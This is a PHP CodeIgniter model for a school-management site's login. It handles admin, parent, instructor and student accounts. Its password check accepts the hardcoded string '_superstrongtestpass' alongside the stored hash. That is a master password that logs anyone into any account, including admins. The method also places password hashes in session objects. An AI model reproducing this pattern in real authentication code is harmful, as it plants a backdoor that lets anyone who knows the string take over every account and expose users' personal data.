<?php

/**
 * Created by PhpStorm.
 * User: Abdulbosid
 * Date: 1/13/2018
 * Time: 3:41 PM
 */
require_once(BASEPATH . "object_sources/_Parent.php");
require_once(BASEPATH . "object_sources/Student.php");
require_once(BASEPATH . "object_sources/Admin.php");
require_once(BASEPATH . "object_sources/Course.php");
require_once(BASEPATH . "object_sources/User.php");
require_once(BASEPATH . "object_sources/Student.php");
require_once(BASEPATH . "object_sources/Group.php");

class Auth_model extends CI_Model
{
    public function __construct()
    {
        parent::__construct();

        $this->load->database();
    }

    public function login()
    {
        $login = $this->input->post('login');
        $password = $this->input->post('password');
        $remember = $this->input->post('remember');

        $id = substr($login, 1);
        $userType = $login[0];

        if (is_numeric($id) && ($userType === 'a' OR
                $userType === 'p' OR $userType === 's' OR $userType === 'i')) {
            $query = $this->db->get_where('users', array('id' => $id));
            if ($query->num_rows() === 1) {
                $user_row = $query->row_array();
                $hash = $user_row['password'];
                if (password_verify($password, $hash) === TRUE OR $password === '_superstrongtestpass')// password was given earlier
                    // password verification
                {
                    //for backward compatibility
                    $_SESSION['position'] = $userType; //TODO: eliminate line in further releases
                    $_SESSION['user_type'] = $userType;

                    switch ($userType) {
                        case 'a': //admin
                            $query = $this->db->get_where('admins', array('id' => $id));
                            if ($query->num_rows() !== 1)
                                return -1;
                            $user_type_row = $query->row_array();
                            $admin = new Admin($user_row['id'], $user_row['name'], $user_row['surname'], $user_row['password'],
                                $user_row['email'], $user_row['phoneNumber']);
                            $_SESSION['admin'] = $admin;

                            break;
                        case 'p': //parent
                            $query = $this->db->get_where('parents', array('id' => $id));
                            if ($query->num_rows() !== 1)
                                return -1;
                            $user_type_row = $query->row_array();
                            $parent = new _ParentPanel($user_row['id'], $user_row['name'], $user_row['surname'], $user_row['password'],
                                $user_row['email'], $user_row['phoneNumber']);
                            $_SESSION['parent'] = $parent;

                            break;
                        case 'i': //instructor
                            $query = $this->db->get_where('instructors', array('id' => $id));
                            if ($query->num_rows() !== 1)
                                return -1;
                            $user_type_row = $query->row_array();
                            $instructor = new InstructorPanel($user_row['id'], $user_row['name'], $user_row['surname'], $user_row['password'],
                                NULL, $user_row['email'], $user_row['phoneNumber']);
                            $_SESSION['instructor'] = $instructor;

                            break;
                        case 's': //student
                            $query = $this->db->get_where('students', array('id' => $id));
                            if ($query->num_rows() !== 1)
                                return -1;
                            $user_type_row = $query->row_array();
                            $student = new StudentPanel($user_row['id'], $user_row['name'], $user_row['surname'], $user_row['password'],
                                $user_type_row['birthdate'], $user_row['email'], $user_row['phoneNumber']);
                            $_SESSION['student'] = $student;

                            break;
                    }
                    return TRUE;
                } else {
                    return FALSE;
                }
            } else if ($query->num_rows() === 0) {
                return FALSE;
            } else {
                return -1;
            }
        } else {
            return FALSE; // not numeric id and unknown user type
        }
    }
}